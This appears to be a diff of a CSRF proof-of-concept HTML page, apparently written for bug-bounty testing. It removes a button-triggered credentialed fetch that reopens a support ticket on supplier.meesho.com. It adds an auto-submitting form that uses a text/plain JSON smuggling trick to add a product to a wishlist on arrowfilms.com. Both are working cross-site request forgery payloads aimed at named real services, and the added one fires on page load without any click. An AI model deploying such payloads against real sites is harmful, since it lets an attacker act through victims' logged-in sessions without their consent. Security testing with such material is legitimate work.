@@ -1,107 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>CSRF PoC – Reopen Ticket (manual click)</title>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      padding: 40px;
-      background: #f8f9fa;
-      line-height: 1.6;
-    }
-    h3 {
-      color: #c0392b;
-    }
-    button {
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 14px 28px;
-      font-size: 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      margin: 20px 0;
-    }
-    button:hover {
-      background: #c0392b;
-    }
-    pre {
-      background: #f0f0f0;
-      padding: 12px;
-      border-radius: 6px;
-      overflow-x: auto;
-    }
-    .note {
-      color: #555;
-      font-size: 0.95em;
-      margin-top: 30px;
-    }
-  </style>
-</head>
 <body>
 
-  <h3>CSRF Test – Reopen Support Ticket</h3>
+<form action="https://www.arrowfilms.com/api/commerce?operation=AddProductToWishlist" method="POST" enctype="text/plain">
 
-  <p>This will attempt to reopen ticket <strong>8771534437535</strong> with reason "test"</p>
+<input type="hidden" name='{"variables":{"sku":17748945},"horizonApq":false,"application":"storefront"}' value="">
 
-  <button onclick="send()">Click to send CSRF</button>
+<input type="submit" value="CSRF Test">
 
-  <div id="result"></div>
+</form>
 
-  <script>
-    function send() {
-      const resultDiv = document.getElementById("result");
-
-      fetch("https://supplier.meesho.com/experienceapi/api/support/reopenTicket", {
-        method: "POST",
-        credentials: "include",           // sends cookies → most important part
-        mode: "cors",                     // we want to see response status if possible
-        cache: "no-cache",
-        headers: {
-          "Content-Type": "application/json;charset=UTF-8",
-          "Accept": "application/json, text/plain, */*",
-          "Client-Package-Version": "1.2.0",
-          "Client-Type": "d-web",
-          "Identifier": "qmhr5",
-          "Browser-Id": "NmkgKyAyMjggKyAxNm9vMDE2b21vbw=="
-          // Origin and Referer are added automatically by the browser
-        },
-        body: JSON.stringify({
-          "ticket_reopening_reason": "test",
-          "ticket_id": 8771534437535,
-          "s3_attachment_urls": [],
-          "supplier_id": 2784913
-        })
-      })
-      .then(response => {
-        resultDiv.innerHTML = `Request sent<br>Status: ${response.status} ${response.statusText}`;
-        resultDiv.style.color = response.ok ? "green" : "darkred";
-        console.log("Response status:", response.status);
-        return response.text();
-      })
-      .then(text => {
-        console.log("Response body:", text);
-      })
-      .catch(error => {
-        resultDiv.innerHTML = "Request failed (most likely blocked by SameSite or CORS)<br>Error: " + error.message;
-        resultDiv.style.color = "orange";
-        console.error("Fetch error:", error);
-      });
-    }
-  </script>
-
-  <div class="note">
-    <strong>How to test:</strong><br>
-    1. Log in to https://supplier.meesho.com in this browser<br>
-    2. Open this HTML file<br>
-    3. Click the button<br>
-    4. Check the support ticket page whether ticket #8771534437535 was reopened<br><br>
-
-    <strong>Expected real-world result (2025–2026):</strong><br>
-    • Most likely <strong>blocked</strong> by SameSite=Lax on session cookies<br>
-    • If it works → serious CSRF vulnerability (report responsibly)
-  </div>
+<script>
+document.forms[0].submit();
+</script>
 
 </body>
 </html>
